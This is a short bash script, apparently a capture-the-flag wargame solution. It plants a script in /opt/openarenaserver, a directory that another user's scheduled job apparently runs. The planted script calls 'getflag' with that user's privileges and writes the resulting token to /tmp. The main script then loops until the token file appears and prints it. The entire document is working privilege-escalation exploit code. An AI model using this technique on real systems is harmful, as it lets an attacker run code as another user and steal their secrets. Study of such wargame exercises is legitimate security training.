#!/bin/bash
echo "#!/bin/bash" > /opt/openarenaserver/script.sh 
echo "getflag > /tmp/token05" >> /opt/openarenaserver/script.sh

while true; do
	ret=`cat /tmp/token05 2> /dev/null`
    if [ -n $ret ]; then
    	break
    fi
done

echo $ret